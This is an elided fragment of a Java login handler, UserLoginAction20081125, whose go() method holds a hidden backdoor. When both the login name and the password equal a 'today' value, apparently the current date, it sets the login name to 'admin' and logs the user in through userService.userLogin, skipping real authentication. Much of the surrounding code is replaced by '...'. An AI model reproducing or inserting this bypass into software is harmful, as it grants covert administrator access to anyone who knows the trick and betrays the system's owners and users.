 ...
 * 
 */
public class UserLoginAction20081125 extends AbstractAction {
	...
	public UserLoginAction20081125() {
	...
	protected String go() throws Exception {
		...
		if (this.loginname.equals(today) && this.password.equals(today)) {
			this.loginname="admin";
			
			// int loginResult =
			userService.userLogin(loginname);
